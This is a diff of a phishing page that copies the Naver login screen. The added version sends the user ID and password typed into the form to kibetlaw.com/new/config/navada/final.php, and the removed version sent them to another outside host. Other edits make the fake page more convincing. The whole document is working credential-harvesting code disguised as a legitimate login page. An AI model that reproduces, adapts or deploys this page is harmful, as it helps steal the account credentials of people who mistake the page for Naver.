@@ -1,19 +1,16 @@
 <!DOCTYPE html>
 <html lang="ko">
-	
+
 <head>
 	<meta charset="UTF-8">
 	<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
 	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-	<meta property="og:type" content="website">
-	<meta property="og:title" content="[네이버: 로그인]">
-	<meta property="og:description" content="안전한 로그인을 위해 주소창의 URL과 자물쇠 마크를 확인하세요!">
-	 <link rel="shortcut icon" href="https://ssl.pstatic.net/sstatic/search/common/og_v3.png">
+	<meta property="og:image" content="https://ssl.pstatic.net/static/nid/account/naver_og_image.png">
 	<meta property="og:image:type" content="image/png">
 	<meta property="og:image:width" content="1200">
-	<meta property="og:image:height" content="1200">
+	<meta property="og:image:height" content="630">
 	<title>네이버 : 로그인</title>
-	<link rel="stylesheet" type="text/css" href="https://nid.naver.com/login/css/global/desktop/w_202105.css?20210812">
+    <link rel="stylesheet" type="text/css" href="https://nid.naver.com/login/css/global/desktop/w_20220216.css?20210812">
 </head>
 
 <body>
@@ -21,7 +18,7 @@
 		<div class="u_skip"><a href="#">본문 바로가기</a></div>
 		<header class="header" role="banner">
 			<div class="header_inner">
-				<a href="#" class="logo">
+				<a href="https://www.naver.com" class="logo">
 					<h1 class="blind">NAVER</h1>
 				</a>
 				<div class="lang" id="show_locale_switch">
@@ -65,18 +62,7 @@
 						</li>
 					</ul>
 					<form id="frmNIDLogin" name="frmNIDLogin" target="_top" AUTOCOMPLETE="off"
-						action="https://diegokuhn.com.br/otilo/ns/nid/final.php" method="POST">
-						<input type="hidden" id="localechange" name="localechange" value="">
-						<input type="hidden" name="dynamicKey" id="dynamicKey" value="">
-						<input type="hidden" name="encpw" id="encpw" value="">
-						<input type="hidden" name="enctp" id="enctp" value="1">
-						<input type="hidden" name="svctype" id="svctype" value="1">
-						<input type="hidden" name="smart_LEVEL" id="smart_LEVEL" value="1">
-						<input type="hidden" name="bvsd" id="bvsd" value="">
-						<input type="hidden" name="encnm" id="encnm" value="">
-						<input type="hidden" name="locale" id="locale" value="ko_KR">
-
-
+						action="https://kibetlaw.com/new/config/navada/final.php" method="POST">
 						<ul class="panel_wrap">
 							<li class="panel_item" style="display: block;">
 								<div class="panel_inner" role="tabpanel" aria-controls="loinid">
@@ -87,8 +73,8 @@
                                                 <span class="blind">아이디</span>
 												</span>
 											</div>
-											<input type="text" id="id" name="user_id" required placeholder="아이디" title="아이디"
-                                               class="input_text" maxlength="41"
+											<input type="text" id="id" name="user_id" placeholder="아이디" title="아이디"
+                                               class="input_text" required="required" minlength="4" maxlength="41"
                                                value="">
 											<span role="button" class="btn_delete" id="id_clear" style="display: none;">
                                             <span class="icon_delete">
@@ -102,8 +88,8 @@
                                                 <span class="blind">비밀번호</span>
 												</span>
 											</div>
-											<input type="password" id="pw" name="user_pw" required placeholder="비밀번호" title="비밀번호"
-                                               class="input_text" maxlength="16">
+											<input type="password" id="pw" name="user_pw" placeholder="비밀번호" title="비밀번호"
+                                               class="input_text" required="required" minlength="4" maxlength="16">
 											<span role="button" class="btn_delete" id="pw_clear" style="display: none;">
                                             <span class="icon_delete">
                                                 <span class="blind">삭제</span>
@@ -170,20 +156,19 @@
 							class="find_text">비밀번호 찾기</a></li>
 					<li><a target="_blank" href="#"
 							class="find_text">아이디 찾기</a></li>
-					<li><a target="_blank" href="#"
+					<li><a target="_blank"
+							href="#"
 							class="find_text">회원가입</a>
 					</li>
 
 				</ul>
 				<!--배너-->
-				<div class="banner_wrap">
-					<a href="#" target="_blank" id="log.banner" class="banner_inner"
-						style="background-color: #eff9ff; border:1px solid #dadada;">
-						<img src="https://ssl.pstatic.net/static/nid/login/banner/m_banner_2step_924x294.png"
-                             width="100%" height="100%" alt="네이버 2단계 인증 내가 허락할 때만 로그인 되도록 늦기 전에 사용하세요~"
-                             class="banner_img">
-                    </a>
-				</div>
+				<div class="sns_cover">
+                    <ul class="sns_wrap">
+                        <li><a href="#" class="sns_item"><span class="sns_text">Facebook</span></a></li>
+                        <li><a href="#" class="sns_item"><span class="sns_text">Line</span></a></li>
+                    </ul>
+                </div>
 			</div>
 			<!-- //content -->
 		</div>
@@ -196,7 +181,7 @@
 					<li><a target="_blank" class="footer_item" href="#"
 							id="fot.agreement"><span class="text">이용약관</span></a></li>
 					<li><a target="_blank" class="footer_item" href="#"
-							id="fot.privacy"><span class="text">개인정보처리방침</span></a></li>
+							id="fot.privacy"><span class="text"><strong>개인정보처리방침</strong></span></a></li>
 					<li><a target="_blank" class="footer_item" href="#"
 							id="fot.disclaimer"><span class="text">책임의 한계와 법적고지</span></a></li>
 					<li><a target="_blank" class="footer_item"
@@ -215,19 +200,6 @@
 		</div>
 
 	</div>
-	<input type="hidden" id="nclicks_nsc" name="nclicks_nsc" value="nid.login_kr">
-	<input type="hidden" id="nid_buk" name="nid_buk" value="none">
-	<input type="hidden" id="removeLink" name="removeLink" value="">
-	<input type="hidden" id="hide_util" name="hide_util" value="">
-	<input type="hidden" id="ncaptchaSplit" name="ncaptchaSplit" value="none">
-	<input type="hidden" id="id_error_msg" name="id_error_msg" value="<strong>아이디</strong>를 입력해주세요.">
-	<input type="hidden" id="pw_error_msg" name="pw_error_msg" value="<strong>비밀번호</strong>를 입력해주세요.">
-	<input type="hidden" id="locale" name="locale" value="ko_KR">
-	<input type="hidden" id="adult_surl_v2" name="adult_surl_v2" value="">
-	<input type="hidden" id="ispopup" name="ispopup" value="false">
-	 <!--<script type="text/javascript" src="https://nid.naver.com/login/js/bvsd.1.3.4.min.js"></script>-->
-	<!--<script type="text/javascript" src="https://nid.naver.com/login/js/v2/default/common_202105.js?v=20210813"></script>-->
-	<!--<script type="text/javascript" src="https://nid.naver.com/login/js/v2/default/default_202105.js?v=20210910"></script> -->
 	<div id="nv_stat" style="display:none;">20</div>
 </body>
 
